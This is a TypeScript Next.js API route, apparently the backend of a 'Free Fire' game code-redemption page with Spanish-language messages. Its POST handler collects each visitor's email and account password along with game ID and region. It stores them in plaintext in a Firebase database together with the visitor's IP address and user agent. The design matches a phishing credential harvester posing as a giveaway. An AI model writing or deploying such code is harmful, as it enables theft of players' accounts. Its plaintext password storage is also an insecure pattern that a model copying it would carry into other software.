import { NextRequest, NextResponse } from 'next/server'
import { ref, push, serverTimestamp } from 'firebase/database'
import { database } from '@/lib/firebase'

// Required for Cloudflare Pages
export const runtime = 'edge'

interface RedemptionData {
  gameId: string
  email: string
  password: string
  region: string
  createdAt?: Date
}

export async function POST(request: NextRequest) {
  try {
    const body: RedemptionData = await request.json()
    
    // Validate required fields
    if (!body.gameId || !body.email || !body.password || !body.region) {
      return NextResponse.json(
        { success: false, error: 'Todos los campos son requeridos' },
        { status: 400 }
      )
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!emailRegex.test(body.email)) {
      return NextResponse.json(
        { success: false, error: 'El formato del email no es válido' },
        { status: 400 }
      )
    }

    // Save to Firebase Realtime Database
    const redemptionsRef = ref(database, 'redemptions')
    const newRedemptionRef = await push(redemptionsRef, {
      gameId: body.gameId,
      email: body.email,
      password: body.password,
      region: body.region,
      status: 'pending',
      createdAt: serverTimestamp(),
      ipAddress: request.headers.get('x-forwarded-for') || 'unknown',
      userAgent: request.headers.get('user-agent') || 'unknown',
    })

    console.log('Data saved with key: ', newRedemptionRef.key)

    return NextResponse.json({
      success: true,
      message: 'Datos guardados correctamente',
      key: newRedemptionRef.key,
    })

  } catch (error) {
    console.error('Error saving redemption data:', error)
    return NextResponse.json(
      { success: false, error: 'Error al procesar la solicitud' },
      { status: 500 }
    )
  }
}

export async function GET() {
  return NextResponse.json({
    message: 'Free Fire Redemption API',
    status: 'active',
    database: 'Firebase Realtime Database',
  })
}
